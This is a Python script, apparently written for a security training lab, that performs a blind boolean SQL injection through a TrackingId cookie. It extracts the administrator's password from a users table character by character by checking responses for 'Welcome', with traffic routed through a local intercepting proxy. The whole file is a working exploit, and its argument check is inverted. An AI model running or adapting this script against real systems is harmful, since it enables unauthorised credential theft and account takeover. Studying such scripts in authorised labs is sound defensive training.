import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }


def sqli_password(url):
    pwd = ""
    for i in range(1,21):
        for j in range(32,126):
            payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')= '%s'--"%(i,j)
            encoded_payload = urllib.parse.quote(payload)
            cookies = {"TrackingId" : "8Ej7OQ81G7thvU2j"+encoded_payload, "session" : "gcSduiAZEVUzuGnCFLMowbQjJCx1QoMZ"}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + pwd + chr(j))
                sys.stdout.flush()
            else:
                pwd += chr(j)
                sys.stdout.write('\r' + pwd)
                sys.stdout.flush()
                break
def main():
    if len(sys.argv) >= 2:  
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    url = sys.argv[1]
    print("[*] Retrieving Password")
    sqli_password(url)

if __name__ == "__main__":
    main()